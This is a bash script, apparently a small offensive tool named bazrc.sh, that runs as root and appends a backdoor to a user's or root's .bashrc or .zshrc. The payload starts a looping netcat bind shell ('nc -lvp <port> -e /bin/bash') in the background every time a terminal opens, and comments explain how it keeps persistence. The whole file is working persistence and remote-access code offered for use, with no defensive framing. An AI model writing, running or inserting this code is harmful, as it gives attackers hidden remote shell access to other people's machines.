#/bin/bash

################################################
# bazrc.sh a script to hijack .bashrc & .zshrc #
#                                 by 0bfxgh0st #
################################################

if [[ $(id -u) != "0" ]]
then
	printf "%s\n" "Run as sudo or root user"
	exit
fi

function _help_(){
	printf "%s\n" "usage sudo bash bazrc.sh <bashrc/zshrc> <port>"
}

### PAYLOADS ###
# Note:        #
# first payload will spawn a shell every time user open a bash/zsh terminal and you can reconnect if user close it.(*a bit bugy but keeps persistence*)
# second payload will spawn a shell every time user open a bash/zsh terminal but you can't reconnect until user open a new terminal(*more stable*)
payload="bash -c \"while [ 0 -eq 0 ]; do nc -lvp $2 -e /bin/bash;done 2>/dev/null &\""
#payload="bash -c \"nc -lvp $2 -e /bin/bash 2>/dev/null &\""
###############

bashrc_user_path="/home/$SUDO_USER/.bashrc"
zshrc_user_path="/home/$SUDO_USER/.zshrc"
bashrc_root_path="/root/.bashrc"
zshrc_root_path="/root/.zshrc"

function _user_bash_and_zsh_hijack_(){

	if [[ "$1" == "bashrc" ]] || [[ "$1" == "bash" ]]
	then

		if [[ $(grep 'nc -lvp' "$bashrc_user_path") == "" ]];
		then
			printf "$payload" >> "$bashrc_user_path"
			printf "[\e[0;32m+\e[0m] $bashrc_user_path hooked\n"
		else
			printf "%s\n" "$bashrc_user_path is already hooked"
		fi

	elif [[ "$1" == "zshrc" ]] || [[ "$1" == "zsh" ]]
	then
		if [[ $(grep 'nc -lvp' "$zshrc_user_path") == "" ]];
        	then
			printf "$payload" >> "$zshrc_user_path"
			printf "[\e[0;32m+\e[0m] $zshrc_user_path hooked\n"
		else
			printf "%s\n" "$zshrc_user_path is already hooked"
		fi

	fi


}

function _root_bash_and_zsh_hijack_(){

	if [[ "$1" == "bashrc" ]] || [[ "$1" == "bash" ]]
	then

		if [[ $(grep 'nc -lvp' "$bashrc_root_path") == "" ]];
		then
			printf "$payload" >> "$bashrc_root_path"
			printf "[\e[0;32m+\e[0m] $bashrc_root_path hooked\n"
		else
			printf "%s\n" "$bashrc_root_path is already hooked"
		fi

	elif [[ "$1" == "zshrc" ]] || [[ "$1" == "zsh" ]]
	then
		if [[ $(grep 'nc -lvp' "$zshrc_root_path") == "" ]];
        	then
			printf "$payload" >> "$zshrc_root_path"
			printf "[\e[0;32m+\e[0m] $zshrc_root_path hooked\n"
		else
			printf "%s\n" "$zshrc_root_path is already hooked"
		fi

	fi

}

if [[ -z "$1" ]] || [[ -z "$2" ]];
then
	_help_
	exit
else
	_root_bash_and_zsh_hijack_ "$1"
fi

